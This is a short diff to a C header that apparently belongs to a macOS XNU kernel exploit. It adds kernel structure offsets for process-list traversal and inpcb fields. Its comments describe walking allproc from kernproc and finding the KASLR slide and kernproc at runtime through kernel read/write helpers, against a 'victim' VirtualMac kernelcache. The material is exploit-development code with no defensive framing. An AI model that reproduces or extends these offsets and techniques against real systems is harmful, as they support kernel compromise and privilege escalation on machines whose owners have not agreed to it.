@@ -83,6 +83,13 @@
 
 /* ---------- more xnu offsets (KDK DWARF, kernel.release.t6050) ---------- */
 #define PROC_OFF_LIST_NEXT          0x00   /* p_list.le_next */
+#define PROC_OFF_LIST_PREV          0x08   /* p_list.le_prev: == &prev_proc
+                                              (le_next at offset 0), or
+                                              &allproc for the head.  Walk
+                                              this from kernproc: kernproc is
+                                              the allproc TAIL (procs are
+                                              LIST_INSERT_HEAD'ed), so its
+                                              le_next is NULL. */
 #define PROC_OFF_RO                 0x18   /* p_proc_ro */
 #define PROC_RO_OFF_TASK            0x08   /* proc_ro.pr_task */
 #define PROC_OFF_PID                0x60   /* p_pid */
@@ -103,9 +110,12 @@
 #define THREAD_OFF_TASK_THREADS     0x400
 
 /* unslid statics (KDK DWARF DW_AT_location) — runtime = these + kaslr slide.
- * slide = read64(A_inpcb + INPCB_OFF_PCBINFO) - XNU_RIPCBINFO            */
-#define XNU_KERNPROC                0xfffffe000728f140ULL
-#define XNU_RIPCBINFO               0xfffffe0007d989a8ULL
+ * slide is discovered at runtime by krw_discover_slide(); kernproc by
+ * krw_discover_kernproc().  The two constants below are UNUSED: they came
+ * from the t6050 KDK whose kernelcache layout differs from the victim's
+ * kernelcache.release.VirtualMac2,1. */
+#define XNU_KERNPROC                0xfffffe000728f140ULL  /* unused */
+#define XNU_RIPCBINFO               0xfffffe0007d989a8ULL  /* unused */
 #define INPCB_OFF_PCBINFO           0x38   /* inp_pcbinfo -> &ripcbinfo */
 #define INPCB_OFF_SOCKET            0x40   /* inp_socket back-pointer */
 
